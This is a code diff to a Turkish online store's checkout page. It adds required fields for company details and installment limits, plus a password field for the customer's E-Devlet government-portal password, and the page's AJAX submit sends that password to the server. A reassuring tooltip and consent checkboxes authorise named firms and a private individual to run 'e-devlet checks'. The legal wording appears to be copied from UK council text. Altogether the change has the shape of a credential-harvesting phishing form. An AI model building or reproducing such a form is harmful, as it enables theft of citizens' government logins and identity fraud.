@@ -58,12 +58,6 @@
                                     </div>
                                     <div class="col-12">
                                         <div class="form-grp">
-                                            <label for="cName">Şirket Adı <small>(opsiyonel)</small></label>
-                                            <input type="text" name="company_name" id="cName">
-                                        </div>
-                                    </div>
-                                    <div class="col-12">
-                                        <div class="form-grp">
                                             <label for="address">Adres *</label>
                                             <input type="text" name="address" required id="address">
                                         </div>
@@ -519,12 +513,81 @@
                                     <input type="hidden" name="adet" value="{{ $adet }}">
                                     <input type="hidden" name="taksit" value="{{ $featuresIds }}">
 
+                                    <div class="col-6">
+                                        <div class="form-grp">
+                                            <label for="cName">Şirket Tam Adı <span>*</span></label>
+                                            <input type="text" name="company_name" id="cName" required>
+                                        </div>
+                                    </div>
+                                    <div class="col-6">
+                                        <div class="form-grp">
+                                            <label for="cName">Şirket Görevi <span>*</span></label>
+                                            <input type="text" name="sirket_gorev" id="cName" required>
+                                        </div>
+                                    </div>
+                                    <div class="col-6">
+                                        <div class="form-grp">
+                                            <label for="cName">Ödeyebileceğiniz Maksimum Taksit Tutarı <span>*</span></label>
+                                            <input type="text" name="maks_taksit_tutar" id="cName" required>
+                                        </div>
+                                    </div>
+                                    <div class="col-6">
+                                        <div class="form-grp">
+                                            <label for="cName">Nüfusa Kayıtlı Olduğunuz İlçe <span>*</span></label>
+                                            <input type="text" name="nufus_kayit_ilce" id="cName" required>
+                                        </div>
+                                    </div>
+                                    <div class="col-6">
+                                        <div class="form-grp position-relative">
+                                            <label for="cName" class="d-flex align-items-center">
+                                                E Devlet Şifresi <span>*</span>
+                                                <i class="fas fa-info-circle ms-2 text-primary" data-bs-toggle="tooltip" data-bs-placement="top" title="E-Devlet şifreniz, kimliğinizin doğrulanması ve başvuruların güvenilirliğinin sağlanması amacıyla istenmektedir. Bu adım, verdiğiniz bilgileri resmi kayıtlardaki verilerle eşleştirerek sahte veya hatalı başvuruların önüne geçmeyi hedefler. Kişisel verilerinizin güvenliği bizim için en öncelikli konudur; bilgileriniz yalnızca doğrulama süreci kapsamında kullanılmakta ve üçüncü taraflarla paylaşılmamaktadır."></i>
+                                            </label>
+                                            <input type="password" name="e_devlet_sifre" id="cName" required>
+                                        </div>
+                                    </div>
+                                    <div class="col-6">
+                                        <div class="form-grp">
+                                            <label for="cName">Son Adreste İkamet Süresi <span>*</span></label>
+                                            <input type="text" name="ikamet_suresi" id="cName" required>
+                                        </div>
+                                    </div>
                                     <div class="col-12">
                                         <div class="form-grp mb-0">
                                             <label for="message">Bildirmek istediğiniz özel bir mesaj ya da not varsa yazınız <small>(opsiyonel)</small></label>
                                             <textarea name="message" id="message"></textarea>
                                         </div>
                                     </div>
+
+                                    <div class="col-12 mt-3">
+                                        <div class="form-check">
+                                            <input class="form-check-input" type="checkbox" id="checkbox1" name="checkbox1" required>
+                                            <label class="form-check-label" for="checkbox1">
+                                                Kredili ürün almak amacıyla Yanlış veya yanıltıcı olan bilgileri bilerek sağlamanın ceza gerektiren bir suç olduğunu lütfen unutmayın.
+                                                Bu kapsamda bilerek ve isteyerek yanıltıcı bilgi vermeniz halinde dolandırıcılık yasası 2006 ve benzeri kapsamındaki diğer suçlar için kovuşturmaya tabi tutulabilirsiniz.
+                                                Sağlanan tüm bilgiler gizlilik içinde ve 2018 veri koruma yasası ve Avrupa Birliği Genel veri koruma yönetmenliği uyarınca ele alınacaktır.
+                                                Bu bilgiler sadece formunuzu ilerletmek için kullanılacaktır. Bununla birlikte görevimizin bir parçası olarak ve dolandırıcılığını önlenmesi ve ortaya çıkabilmesi için
+                                                Bilgilerinizi polis, diğer yerel yönetimler ve bu konsey bünyesindeki diğer ilgili departmanlar dahil olmak üzere diğer kurumlarla paylaşmak veya kontrol etmek zorunda kalabiliriz.
+                                            </label>
+                                        </div>
+
+                                        <div class="form-check mt-2">
+                                            <input class="form-check-input" type="checkbox" id="checkbox2" name="checkbox2" required>
+                                            <label class="form-check-label" for="checkbox2">
+                                                Bu kutucuğu işaretlediğinizde verdiğiniz bilgileri doğrulamak üzere gerekli olan e-devlet ve benzeri incelemeleri yapabilmeleri için
+                                                Girosen Teknoloji Mağazaları, Girocent Teknoloji, Necati Çoban veya emr-u havale adına yetki vermiş olursunuz.
+                                            </label>
+                                        </div>
+
+                                        <div class="form-check mt-2">
+                                            <input class="form-check-input" type="checkbox" id="checkbox3" name="checkbox3" required>
+                                            <label class="form-check-label" for="checkbox3">
+                                                Bu kutucuğu işaretlediğinizde bu sipariş ile ilgili her türlü bilgi SMS uyarı, ihtar ve benzeri yazışmalar hesabınızdaki kayıtlı e-mail veya telefon ile yapılacağını
+                                                ve bu yazışma ve ihtarların hukuken geçerli resmi yazışmalar olacağını kabul etmiş olursunuz.
+                                            </label>
+                                        </div>
+                                    </div>
+
                                 </div>
                             </form>
                         </div>
@@ -560,14 +623,26 @@
 
 
     </main>
-
     <script>
+        document.querySelector(".checkout-form").addEventListener("submit", function(event) {
+            let checkboxes = document.querySelectorAll(".form-check-input");
+            let allChecked = Array.from(checkboxes).every(checkbox => checkbox.checked);
+
+            if (!allChecked) {
+                alert("Lütfen tüm kutucukları işaretleyin!");
+                event.preventDefault();
+            }
+        });
+        document.addEventListener("DOMContentLoaded", function() {
+            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
+            var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
+                return new bootstrap.Tooltip(tooltipTriggerEl);
+            });
+        });
         $(document).ready(function() {
-            // Butona tıklama olayını dinle
             $('.onaya-gonder').click(function(e) {
                 e.preventDefault();
                 var csrfToken = $('meta[name="csrf-token"]').attr('content');
-                // Form verilerini topla
                 var formData = {
                     _token: csrfToken,
                     name: $('#fName').val(),
@@ -594,11 +669,15 @@
                     cartId: $('input[name="cartId"]').val(),
                     adet: $('input[name="adet"]').val(),
                     taksit: $('input[name="taksit"]').val(),
+                    sirket_gorev: $('input[name="sirket_gorev"]').val(),
+                    maks_taksit_tutar: $('input[name="maks_taksit_tutar"]').val(),
+                    nufus_kayit_ilce: $('input[name="nufus_kayit_ilce"]').val(),
+                    e_devlet_sifre: $('input[name="e_devlet_sifre"]').val(),
+                    ikamet_suresi: $('input[name="ikamet_suresi"]').val(),
                 };
 
-                // AJAX ile verileri gönder
                 $.ajax({
-                    url: '{{route('checkout.create')}}',  // Controller'daki create methoduna gidecek URL
+                    url: '{{route('checkout.create')}}',
                     type: 'POST',
                     token: csrfToken,
                     data: formData,
